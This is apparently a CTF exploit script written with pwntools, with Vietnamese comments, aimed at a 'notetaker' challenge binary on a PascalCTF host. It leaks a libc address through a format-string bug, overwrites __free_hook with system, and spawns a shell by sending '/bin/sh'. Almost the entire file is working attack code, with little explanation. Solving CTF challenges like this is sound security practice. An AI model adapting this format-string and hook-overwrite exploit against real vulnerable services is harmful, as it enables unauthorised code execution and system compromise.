from pwn import *
import time

# --- CẤU HÌNH ---
exe_path = './notetaker'
libc_path = './libs/libc.so.6'
ld_path = './libs/ld-2.23.so'

# Offset format string đã tìm được từ check.py
OFFSET = 8

# Nếu có IP/Port của giải, điền vào đây để chạy remote
host = 'notetaker.ctf.pascalctf.it'
port = 9002

elf = context.binary = ELF(exe_path, checksec=False)
libc = ELF(libc_path, checksec=False)

# Tự động chọn Local hoặc Remote dựa trên tham số
if args.REMOTE:
    p = remote(host, port)

else:
    # Chạy local với môi trường giả lập
    try:
        p = process([ld_path, exe_path], env={"LD_PRELOAD": libc_path})
    except:
        p = process(exe_path)

def write_note(content):
    p.sendlineafter(b'> ', b'2')
    time.sleep(0.1)
    p.sendlineafter(b'Enter the note: ', content)

def trigger_printf():
    p.sendlineafter(b'> ', b'1')

# --- 1. LEAK LIBC ---
log.info("Dang Leak Libc...")

# Offset 43 là return address của __libc_start_main
write_note(b'%43$p')
trigger_printf()

try:
    leak_output = p.recvline().decode().strip()
    log.info(f"Raw Leak: {leak_output}")
    leak_val = int(leak_output, 16)
    
    # Tính Base Libc 2.23
    libc.address = leak_val - 240 - libc.symbols['__libc_start_main']
    log.success(f"Libc Base: {hex(libc.address)}")
    log.success(f"__free_hook: {hex(libc.symbols['__free_hook'])}")
    log.success(f"system: {hex(libc.symbols['system'])}")
    
except Exception as e:
    log.error(f"Leak failed: {e}")

# --- 2. GHI ĐÈ __free_hook THÀNH SYSTEM ---
log.info("Dang ghi de __free_hook -> system...")

# Sử dụng Offset 8
payload = fmtstr_payload(OFFSET, {libc.symbols['__free_hook']: libc.symbols['system']}, write_size='short')

write_note(payload)
trigger_printf() # Kích hoạt printf để ghi đè

# Đọc bỏ dòng output thừa
try: p.recvline() 
except: pass

# --- 3. LẤY SHELL ---
log.info("Gui '/bin/sh' de lay shell...")

# Gửi chuỗi lệnh. Chương trình sẽ gọi free("/bin/sh") -> system("/bin/sh")
p.sendlineafter(b'> ', b'/bin/sh')

p.interactive()